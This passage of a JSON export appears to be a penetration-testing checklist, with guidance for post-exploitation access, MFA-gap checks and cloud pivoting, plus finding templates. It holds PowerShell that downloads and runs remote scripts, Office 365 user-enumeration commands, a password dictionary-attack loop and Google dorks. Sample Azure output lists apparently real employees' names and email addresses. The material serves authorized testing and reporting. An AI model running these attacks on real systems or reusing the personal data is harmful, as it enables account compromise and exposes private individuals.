						"instructions": "<h2>Instructions</h2><p>This item is intended to provide guidance for obtaining read access to devices and information.</p><p>In order to use read access as an entry point you'll need to find <strong>authentication tokens</strong>. Those include thinks like passwords, session cookies, and private keys. To increase your luck, research the OS and installed applications to determine where they store that type of information by default. Then, simply use the passwords, session cookies, or keys to login.</p><p>Vulnerabilities can potentially allow read access to:</p><ul><li><p>Memory</p></li><li><p>File System</p></li><li><p>Registry</p></li><li><p>Database</p></li></ul><p><strong>Questions to ask yourself:</strong></p><ol><li><p>What files and paths can I read from?</p></li><li><p>Where does the OS and installed applications store credentials?</p></li><li><p>Can I read privileged files (do I have root/administrator)?</p></li><li><p>Can I read any authentication tokens?</p></li><li><p>If yes, then how do I use them to login?</p></li><li><p>If not, then write the finding up and move on.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "cb8fde38-0f56-4f03-893e-e8b89efcb4cb",
						"name": "Write Access Guidance",
						"instructions": "<h2>Instructions</h2><p>This item is intended to provide guidance for obtaining writ access to devices and information.</p><p>In order to use write access as an Entry Point you'll need to write code, content, or files to locations <strong>where you can control their execution or inject an authentication token</strong>.</p><p>Vulnerabilities can potentially allow write access to the follow areas:</p><ul><li><p>Memory</p></li><li><p>File System</p></li><li><p>Registry</p></li><li><p>Database</p></li></ul><p>There are primarily two scenarios you'll run into regarding file access, restricted and arbitrary write access. It can be used as a general example for the other areas.</p><p><strong>Restricted file write</strong></p><p>The vulnerability provides write access to files, but it is restricted to a specific file or path.</p><p><strong>Arbitrary file write</strong></p><p>The vulnerability provides write access any file or path. The only thing restricting write access to files in this scenario are the privileges of the acting user. In most cases that will be a service account of some kind.</p><p>For example, the account running IIS may not have write access the all users startup directory.</p><p><strong>Questions to ask yourself</strong></p><ol><li><p>What files and paths can I write to?</p></li><li><p>Where are OS and application autorun locations?</p></li><li><p>Do I have administrative write access?</p></li><li><p>Can I write my own authentication tokens within the application or OS?</p></li><li><p>If yes, then how do I use them to login?</p></li><li><p>If not, then write the finding up and move on.</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "03a53166-3433-4635-a9ef-ffad8eb2834f",
						"name": "Execute Access Guidance",
						"instructions": "<h2>Instructions</h2><p>This item is intended to provide guidance for obtaining execution access to devices.</p><p>These types of issues allow direct code execution within the context of the service account. This is typically a canned exploit or unauthorized access to functionality that is intended to execute commands or code.</p><p>The general guidance is find a safe reliable exploit to run. Review the verification instructions. If a vulnerability recommendation does not already exist make sure to get a second opinion before running as exploit.</p><p>If you are targeting existing functionality in an application, database, or operating system, then read the documentation for guidance.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "8866c719-abf6-4d80-955c-92c3b2bcd7d4",
						"name": "Credential Access Guidance",
						"instructions": "<h2>Instructions</h2><p>This item is intended to provide guidance for obtaining credential access from devices.</p><p>Attempt to log into application and management interfaces that support the authentication method. Then attempt to pivot through that medium into the internal network zones. If MFA exists, take a little to time to understand if a bypass is possible via self-service portals or other options.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 15,
				"collapsed": true
			},
			{
				"uid": "e72531ba-8de2-42f2-a514-75e35ea139e1",
				"name": "Post Exploitation: Missing MFA",
				"description": "",
				"type": 1,
				"tasks": [
					{
						"uid": "842233a9-3744-4026-9834-20ff37dbefa1",
						"name": "Single Factor Web Interface (Generic)",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to web interfaces and determine if MFA is enabled.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17065400,
							"uid": "b06b4e76-9ce0-e911-811b-ecf4bbd04083",
							"name": "Weak Configuration - External Web Interface - MFA Not Enabled",
							"description": "<p>A public facing web interface is not configured with multi-factor authentication (MFA).</p>",
							"severityId": 2,
							"businessImpact": "<p>If an attacker successfully guesses a user's password they will be able to access that user's resources from the internet.  Indirectly, this could potentially lead to unauthorized access to the affected user's applications, systems, and connected networks.</p>",
							"sourceIdentifier": "M:785882d2-47d7-40de-bc64-9eabe058f53c",
							"verificationInstructions": "",
							"references": "<ul><li>https://www.cisa.gov/resources-tools/resources/multi-factor-authentication-mfa</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html&#35;multi-factor-authentication</li><li>https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Work with the web application vendor to determine if multi-factor authentication (MFA) is supported and implement it according to their instructions. If MFA options are not supported, place the web interface behind a firewall so that it is no longer accessible to the internet.</p>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "ea83b224-598b-4af6-a4ae-9f447fab6906",
						"name": "Single Factor Administrative Interface",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to web interfaces and determine if MFA is enabled. <strong>Note: </strong>Administrative interfaces are interfaces that are intended to be used only by site administrators (e.g. firewall administrative login page), and does <strong>not</strong> include the other categories of this section that are intended for users (e.g. Citrix, Office365, etc.).</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17098806,
							"uid": "1b753161-4714-4221-a78d-b103731f4855",
							"name": "Weak Configuration - Administrative Interface - MFA Not Enabled",
							"description": "<p>A public facing remote administration web interface is not configured with multi-factor authentication (MFA).</p>",
							"severityId": 2,
							"businessImpact": "<p>If an attacker successfully guesses a user's password they will be able to access that user's resources from the internet. This could lead to unauthorized access to applications, systems, non public data and connected networks.</p>",
							"sourceIdentifier": "M:1b753161-4714-4221-a78d-b103731f4855",
							"verificationInstructions": "<p>Show the login page with valid credentials blurred. Also show the post-login page where you are able to access Remote Access or Management functionality.</p>",
							"references": null,
							"exploitInstructions": null,
							"remediationInstructions": "<p>Work with the web application vendor to determine if multi-factor authentication (MFA) is supported and implement it according to their instructions. If MFA options are not supported, place the web interface behind a firewall so that it is no longer accessible to the internet.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d72b2132-d75e-4e18-90a0-075c58cb2b95",
						"name": "Single Sign On - ADFS Launch Page",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to ADFS endpoints and determine if MFA is enabled.</p><h2>Variation: Google Dorks</h2><p>Use the Google dork below to attempt to identify potential sso landing pages.</p><pre><code>filetype:aspx IdpInitiatedSignOn.aspx company\nfiletype:aspx IdpInitiatedSignOn.aspx &quot;Sign in to one of the following sites:&quot; company</code></pre><p>Sometimes they are registered on the domain </p><pre><code>https://sts.company.com/adfs/ls/IdpInitiatedSignOn.aspx</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "21d3a723-a86c-49fe-a6ed-4614b5f3fcc9",
						"name": "Single Factor Azure",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17062400,
							"uid": "161d90c9-6083-e711-80fd-ecf4bbd04083",
							"name": "Weak Configuration - MFA Not Enabled - Azure",
							"description": "<p>The Azure configuration does not currently enforce multi-factor authentication (MFA) for all accounts.</p>",
							"severityId": 2,
							"businessImpact": "<p>If an attacker successfully guesses a Azure AD user's password they will be able to access that user's Azure resources from the internet.  This could also lead to unauthorized access to the affected user's system and connected networks.</p>",
							"sourceIdentifier": "M:161d90c9-6083-e711-80fd-ecf4bbd04083",
							"verificationInstructions": "<p>Confirm that MFA is not required for the Azure account by using Login-AzureRmAccount to login.</p><p>install-module azurerm</p><p>Login-AzureRmAccount -Verbose</p><p> VERBOSE: Performing the operation \"log in\" on target \"User account in environment 'AzureCloud'\".</p><p>Environment           : AzureCloud</p><p>Account               : CAG@wingsfinancial.com</p><p>TenantId              : 2375eba9-af99-4b2d-8eaf-7884911dde9f</p><p>SubscriptionId        : </p><p>SubscriptionName      : </p><p>CurrentStorageAccount :  </p><p>PS C:\\windows\\system32&gt; get-AzureRmADUser</p><p>UserPrincipalName                       DisplayName             Id                                  </p><p>-----------------                       -----------             --                                  </p><p>1185z9@wingsfinancialcu.onmicrosoft.com Dan N. Riley            63a5d579-2789-4396-83d5-73aa2be9a8c8</p><p>1441@wingsfinancial.com                 Michelle Lange          fd60fdce-0181-4ef3-9b83-73e1e994fb20</p><p>1518@wingsfinancial.com                 Abigail Sisley          f37d4217-8239-4083-931d-c2ea1e3197c1</p><p>1596@wingsfinancial.com                 Karen Barrett           12cc630c-9f72-4828-82ea-4107d330f1a5</p><p>1598@wingsfinancial.com                 Gail Mills              48f6b83d-e0af-44ad-9bdc-db2292ab5cc6</p><p>1599@wingsfinancial.com                 Janet Pedersen          f2fa52c5-971e-4c88-981b-7a1c08a9b1ed</p><p>1600@wingsfinancial.com                 Diane Weibye-Buzzell    148936ca-47ee-49eb-b916-529d8845e05e</p><p>1603@wingsfinancial.com                 Phanta Liu              a05137f5-8a93-4da4-8fd8-94d62a095463</p><p>1608@wingsfinancial.com                 Barb Wajda              a09dbdcc-670b-4b1c-8308-ee9c8247ba90</p><p>get-command -module \"&#42;azurerm&#42;\"</p><p> PS C:\\windows\\system32&gt; Get-ADResourceProperty </p><p>get-azureRMAdGroup</p><p>alternatively</p><p>https://docs.microsoft.com/en-us/azure/cli-install-nodejs</p><p>http://aka.ms/webpi-azure-cli</p><p>azure login</p><p>https://docs.microsoft.com/en-us/azure/xplat-cli-connect</p><p>azure login -u myUserName@contoso.onmicrosoft.com</p><p>You can also just log into the Azure portal</p><p>log into https://portal.azure.com/</p><p>https://docs.microsoft.com/en-us/rest/api/</p><p>Also you can do the following:</p><p>In google search:</p><p>inurl:adfs/ls/IdpInitiatedSignOn.aspx site: clientdomain.com</p><p>inurl:/idp/startSSO.ping?PartnerSpId= site: clientdomain.com</p><p>If you have a page come back they typically include site where federated authentication can be used.</p><p>Azure - https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/introducing-azucar/</p>",
							"references": "<ul><li>https://docs.microsoft.com/en-us/azure/multi-factor-authentication/multi-factor-authentication-get-started-cloud</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Configure Azure to enforce the use of Multi-Factor Authentication (MFA).  This can be done from the  Azure MFA Management Portal.</p><p>For more information visit: </p><p>https://docs.microsoft.com/en-us/azure/multi-factor-authentication/multi-factor-authentication-whats-next</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "caa4cc0c-d185-4698-a6cf-2efe4748bf46",
						"name": "Single Factor Citrix",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to Citrix endpoints and determine if MFA is enabled.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17059911,
							"uid": "7631ac27-7d03-e711-80f5-ecf4bbd04083",
							"name": "Remote Management Interface - Citrix - MFA Not Enabled",
							"description": "<p>A Citrix remote desktop or application publishing server was found available which may provide access to a private Local Area Network (LAN) from a remote location.  The affected servers don't appear to require Multi-Factor Authentication (MFA).</p>",
							"severityId": -2,
							"businessImpact": "<p>A remote unauthenticated attacker may be able to conduct successful password guessing attacks if  Multi-Factor Authentication (MFA) has not been implemented.</p>",
							"sourceIdentifier": "M:7631ac27-7d03-e711-80f5-ecf4bbd04083",
							"verificationInstructions": "",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure Multi-Factor Authentication (MFA) is implemented on all management interfaces exposed to the internet.  Alternatively, consider placing them behind a firewall to ensure only LAN and VPN user are able to access them.</p>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5ddad71e-afde-4305-9ee9-51ed25c2e0a3",
						"name": "Single Factor CMS",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to CMS endpoints and determine if MFA is enabled. Target other management interfaces exposed to the internet that may accept domain credentials.</p><h3>Examples:</h3><p>Jira</p><p>Confluence</p><p>Drupal</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "85ae3245-b9c1-40ca-95f5-55826a28f898",
						"name": "Single Factor Office 365",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to O365 endpoints and determine if MFA is enabled.</p><p>Below are some notes for grabbing a list of domain users and other information via ADFS using acquired credentials if multi-factor authentication (MAL) has not been enabled in Azure/Office365 environments.</p><h3>Install Apps</h3><p>1. Download and install visual studio 10</p><p>2. Downoad and install the Lync SDK</p><pre><code>https://www.microsoft.com/en-us/download/details.aspx?id=36824</code></pre><p>3. Download and install Microsoft Online Services Sign-In Assistant for IT Professionals RTW</p><pre><code>http://go.microsoft.com/fwlink/?LinkID=286152</code></pre><p>4. Download and Install the Azure Active Directory Module for Windows PowerShell (64-bit version)</p><pre><code>http://go.microsoft.com/fwlink/p/?linkid=236297</code></pre><p>5. Import the scripts</p><pre><code>git clone https://github.com/NetSPI/PowerShell\nimport-module PowerSkype.ps1\nimport-module Get-FederationEndpoint.ps1</code></pre><p>OR</p><pre><code>iex(New-Object net.webclient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1&quot;)\niex(New-Object net.webclient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/PowerSkype.ps1&quot;)</code></pre><h3>Fingerprint Federated and Managed Domains</h3><p>Summary:</p><ul><li><p>managed = in ms cloud</p></li><li><p>federated = internally hosted</p></li></ul><p>1. Check if domain email is managed or federated.</p><pre><code>Get-FederationEndpoint -domain domain.com\nEmail     : username@domain.com\nType      : Federated\nDomain    : domain.com\nBrandName : domain.com\nAuthURL   : https://idp.domain.com/idp/profile/SAML2/POST/SSO</code></pre><p>2. Check if domain is managed or federated</p><pre><code>Get-SkypeFederation -domain domain.com\nDomain                 : domain.com\nMS=MS&#42;                 : True\n_sip._tcp              : True\n_sip._tls              : False\n_sipfederationtls._tcp : False</code></pre><p>3. Get skype status</p><pre><code>Get-SkypeStatus -email username@domain.com</code></pre><h3>Information Gathering for Managed Domains</h3><ol><li><p>Get list of emails for azure services - must be managed domain</p></li><li><p>Reference: https://msdn.microsoft.com/en-us/library/azure/dn194123(v=azure.98).aspx</p></li><li><p>Reference: https://msdn.microsoft.com/en-us/library/azure/jj151815(v=azure.98).aspx</p></li><li><p>See references for other command examples</p></li><li><p>Get Domain Users</p></li></ol><pre><code>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord\nconnect-msolservice -credential $credentials\nGet-MsolDomain\nGet-MsolUser</code></pre><h3>Information Gathering for federated Domains</h3><ol><li><p>Get Domain Users</p></li></ol><pre><code>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord\nNew-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection\nGet-PSSession\nId Name            ComputerName    State         ConfigurationName     Availability\n-- ----            ------------    -----         -----------------     ------------\n2 Session2         outlook.offi... Opened        Microsoft.Exchange       Available\nEnter-PSSession 2\nGet-Command | Select-Object Name</code></pre><h3>Execute a single command and store results to excel file and get domain user information</h3><pre><code>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;username@domain.com&quot;, $PWord\nInvoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {Get-Recipient -ResultSize unlimited} | Export-CSV c:\\temp\\domain_users.csv -NoTypeInformation</code></pre><ol><li><p>Super slow / dirty dictionary attack option</p></li></ol><pre><code>$Users = Get-Content C:\\temp\\users.txt\n$Password = &quot;Password&quot;\n$Users |\nForEach-Object {\nWrite-Output &quot;Testing $Password on $_&quot;\n$PWord = ConvertTo-SecureString -String &quot;$Password&quot; -AsPlainText -Force\n$credentials = New-Object -TypeName &quot;System.Management.Automation.PSCredential&quot; -ArgumentList &quot;$_&quot;, $PWord\nInvoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {get-user | select-object name -expandproperty name}\n}</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17059065,
							"uid": "0bfc36e9-396d-e611-80e5-ecf4bbd04083",
							"name": "Weak Configuration - MFA Not Enabled - Office 365",
							"description": "<p>Multi-factor Authentication (MFA) was not enabled for Office 365 users.</p><p>Microsoft states that &quot;Azure multi-factor authentication is a method of verifying who you are that requires the use of more than just a username and password. Using MFA for Office 365, users are required to acknowledge a phone call, text message, or app notification on their smart phones after correctly entering their passwords. They can sign in only after this second authentication factor has been satisfied.&quot;</p><p>Note: A form of multi-factor authentication is included with Office 365, but you can also purchase Azure multi-factor authentication that includes extended functionality.</p>",
							"severityId": -2,
							"businessImpact": "<p>If an Azure or Office365 account is compromised, an attacker may be able to gain unauthorized access to systems, applications, email, and sensitive information from the internet without having authenticate using a second factor.</p>",
							"sourceIdentifier": "M:0bfc36e9-396d-e611-80e5-ecf4bbd04083",
							"verificationInstructions": "<p>Below are some notes for grabbing a list of domain users and other information via ADFS using acquired credentials if multi-factor authentication (MAL) has not been enabled in Azure/Office365 environments.</p><p>Install Apps</p><p>Download and install visual studio 10</p><p>Downoad and install the Lync SDK</p><p>https://www.microsoft.com/en-us/download/details.aspx?id=36824</p><p>Download and install Microsoft Online Services Sign-In Assistant for IT Professionals RTW </p><p>http://go.microsoft.com/fwlink/?LinkID=286152</p><p>Download and Install the Azure Active Directory Module for Windows PowerShell (64-bit version)</p><p>http://go.microsoft.com/fwlink/p/?linkid=236297</p><p>Import the scripts</p><p>git clone https://github.com/NetSPI/PowerShell</p><p>import-module PowerSkype.ps1</p><p>import-module Get-FederationEndpoint.ps1</p><p>or </p><p>iex(New-Object net.webclient).DownloadString(\"https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-FederationEndpoint.ps1\")</p><p>iex(New-Object net.webclient).DownloadString(\"https://raw.githubusercontent.com/NetSPI/PowerShell/master/PowerSkype.ps1\")</p><p>Fingerprint Federate and Managed Domains</p><p>1. Summary: managed = in ms cloud; federated = internally hosted</p><p>2. Check if domain email is managed or federated</p><p>Get-FederationEndpoint -domain domain.com</p><p>Email     : username@domain.com</p><p>Type      : Federated</p><p>Domain    : domain.com</p><p>BrandName : domain.com</p><p>AuthURL   : https://idp.domain.com/idp/profile/SAML2/POST/SSO</p><p>1. Check if domain is managed or federated</p><p>Get-SkypeFederation -domain domain.com</p><p>Domain                 : domain.com</p><p>MS=MS&#42;                 : True</p><p>_sip._tcp              : True</p><p>_sip._tls              : False</p><p>_sipfederationtls._tcp : False</p><p>1. Get skype status</p><p>Get-SkypeStatus -email username@domain.com</p><p>Information Gathering for Managed Domains</p><ol><li><p>Get list of emails for azure services - must be managed domain</p></li><li><p>Reference: https://msdn.microsoft.com/en-us/library/azure/dn194123(v=azure.98).aspx</p></li><li><p>Reference: https://msdn.microsoft.com/en-us/library/azure/jj151815(v=azure.98).aspx</p></li><li><p>See references for other command examples</p></li><li><p>Get Domain Users</p></li></ol><p>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force</p><p>$credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"username@domain.com\", $PWord</p><p>connect-msolservice -credential $credentials</p><p>Get-MsolDomain</p><p>Get-MsolUser</p><p>Information Gathering for federated Domains</p><ol><li><p>Get Domain Users</p></li></ol><p>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force</p><p>$credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"username@domain.com\", $PWord</p><p>New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection</p><p>Get-PSSession</p><p> Id Name            ComputerName    State         ConfigurationName     Availability</p><p> -- ----            ------------    -----         -----------------     ------------</p><p>  2 Session2        outlook.offi... Opened        Microsoft.Exchange       Available</p><p>Enter-PSSession 2</p><p>Get-Command | Select-Object Name</p><p>Execute a single command and store results to excel file - get domain user information</p><p>$PWord = ConvertTo-SecureString -String 'SecurePassword!' -AsPlainText -Force</p><p>$credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"username@domain.com\", $PWord</p><p>Invoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {Get-Recipient -ResultSize unlimited} | Export-CSV c:\\temp\\domain_users.csv -NoTypeInformation</p><ol><li><p>Super slow / dirty dictionary attack option</p></li></ol><p>$Users = Get-Content C:\\temp\\users.txt</p><p>$Password = \"Password\"</p><p>$Users | </p><p>ForEach-Object {</p><p>    Write-Output \"Testing $Password on $_\"</p><p>    $PWord = ConvertTo-SecureString -String \"$Password\" -AsPlainText -Force</p><p>    $credentials = New-Object -TypeName \"System.Management.Automation.PSCredential\" -ArgumentList \"$_\", $PWord</p><p>    Invoke-Command -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $Credentials -Authentication Basic -AllowRedirection -ScriptBlock {get-user | select-object name -expandproperty name} </p><p>}</p>",
							"references": "<ul><li>https://support.office.com/en-us/article/Set-up-multi-factor-authentication-for-Office-365-users-8f0454b2-f51a-4d9c-bcde-2c48e41621c6</li></ul>",
							"exploitInstructions": "<p>Enumerate domain users and conduct dictionary attacks</p><p>Log into azure environment and access the servers and data</p>",
							"remediationInstructions": "<p>Consider requiring multi-factor authentication for Azure and Office 365 accounts to help prevent unauthorized access to sensitive systems, applications, email, and sensitive data.</p>"
						},
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "8876f187-2dcd-42e6-8061-1878a8467935",
						"name": "Single Factor Terminal Services",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to terminal endpoints and determine if MFA is enabled. This could be RDP or web-based terminal services.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064591,
							"uid": "54384e80-af33-e911-810c-ecf4bbd04083",
							"name": "Remote Management Interface - Terminal Services - MFA Not Enabled",
							"description": "<p>A Terminal Services server was found available from the internet which may provide access to a private Local Area Network (LAN) from a remote location.  The affected servers don't appear to require Multi-Factor Authentication (MFA).</p>",
							"severityId": -2,
							"businessImpact": "<p>A remote unauthenticated attacker may be able to conduct successful password guessing attacks if  Multi-Factor Authentication (MFA) has not been implemented.</p>",
							"sourceIdentifier": "M:3c1ec35b-6af2-4889-a36b-1cb52b2c011d",
							"verificationInstructions": "<p>This could be traditional remote desktop living on port 3389 or non-standard port.</p><p>This could also be web based terminal services configured without two-factor.</p>",
							"references": "",
							"exploitInstructions": "<p>This could be traditional remote desktop living on port 3389 or non-standard port.</p><p>This could also be web based terminal services configured without two-factor.</p>",
							"remediationInstructions": "<p>Ensure Multi-Factor Authentication (MFA) is implemented on all management interfaces exposed to the internet.  Alternatively, consider placing them behind a firewall to ensure only LAN and VPN user are able to access them.</p>"
						},
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "cdad6893-1726-4474-9f73-32e7828e83f9",
						"name": "Single Factor VMWare VDI",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to VDI endpoints and determine if MFA is enabled.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064592,
							"uid": "1f07f43d-b133-e911-810c-ecf4bbd04083",
							"name": "Remote Management Interface - VDI - MFA Not Enabled",
							"description": "<p>A Virtual desktop infrastructure (VDI) server was found available from the internet which may provide access to a private Local Area Network (LAN) from a remote location.  The affected servers don't appear to require Multi-Factor Authentication (MFA).</p>",
							"severityId": -2,
							"businessImpact": "<p>A remote unauthenticated attacker may be able to conduct successful password guessing attacks if  Multi-Factor Authentication (MFA) has not been implemented.</p>",
							"sourceIdentifier": "M:1719505c-bdd9-4f7e-81a0-e582091d0673",
							"verificationInstructions": "<p>This could be a website.</p><p>This could be a vendor specific VDI port.</p>",
							"references": "",
							"exploitInstructions": "<p>This could be a website.</p><p>This could be a vendor specific VDI port.</p>",
							"remediationInstructions": "<p>Ensure Multi-Factor Authentication (MFA) is implemented on all management interfaces exposed to the internet.  Alternatively, consider placing them behind a firewall to ensure only LAN and VPN user are able to access them.</p>"
						},
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "028be9b3-d0e7-4c6b-80fc-387a13995ba9",
						"name": "Single Factor VPN",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to VPN endpoints and determine if MFA is enabled.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17057476,
							"uid": "c02dd84e-6e98-e511-80d7-ecf4bbd04073",
							"name": "Remote Management Interface - VPN - MFA Not Enabled",
							"description": "<p>Virtual Private Network (VPN) technology is used by a client system to securely connect to a private Local Area Network (LAN) from a remote location. The affected VPN servers don't appear to require Multi-Factor Authentication (MFA).</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker may be able to conduct password guess attacks with a known user list and gain unauthorized access to internal network resources over VPN.</p>",
							"sourceIdentifier": "M:c02dd84e-6e98-e511-80d7-ecf4bbd04073",
							"verificationInstructions": "<p>owa - direct or web based</p><p>citrix - direct or web based</p><p>terminal  services</p><p>vde</p><p>vpn without two factor</p><p>azure</p><p>outline</p><p>federated / managed ads</p><p>cover off house</p><p>cover proxy through another country</p><p>test user and admins</p>",
							"references": "",
							"exploitInstructions": "<p>owa - direct or web based</p><p>citrix - direct or web based</p><p>terminal  services</p><p>vde</p><p>vpn without two factor</p><p>azure</p><p>outline</p><p>federated / managed ads</p><p>cover off house</p><p>cover proxy through another country</p><p>test user and admins</p>",
							"remediationInstructions": "<p>Configure the VPN solution to enforce the use of Multi-Factor Authentication (MFA).</p>"
						},
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 16,
				"collapsed": true
			},
			{
				"uid": "070a0425-11b6-4974-842e-20c53fc24766",
				"name": "Post Exploitation: Direct Remote Access Options",
				"description": "The goal of this group of tasks is to provide guidence on where to use aquired Active Directory domain credentials in order pivot into restricted cloud and on premise enviornments.",
				"type": 1,
				"tasks": [
					{
						"uid": "dddb717f-b8f7-44e4-9820-85eb0f85994a",
						"name": "Cloud Services - Amazon/AWS",
						"instructions": "<h2>Instructions</h2><p>Attempt to identify Amazon/AWS services.</p><h2>Variation: Manual</h2><p>1. Attempt to log into the following URL to check for missing mfa.</p><pre><code>https://signin.aws.amazon.com</code></pre><h3>Reference</h3><p>Include shodan and censys.io to identify AWS use.</p><h3>Tools</h3><p>https://github.com/nccgroup/Scout2</p><p>https://github.com/carnal0wnage/weirdAAL</p><p>https://github.com/carnal0wnage/weirdAAL/wiki</p><p>https://github.com/cyberark/SkyArk</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "8fc29be8-132b-43a9-8075-5dd73eb624ea",
						"name": "Cloud Services - Digital Ocean Console",
						"instructions": "<h2>Instructions</h2><p>Attempt to login to Digital Ocean and determine if MFA is enabled.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "65140836-8c96-4b23-8748-eb6e951db7e1",
						"name": "Cloud Services - Azure - Portal Access",
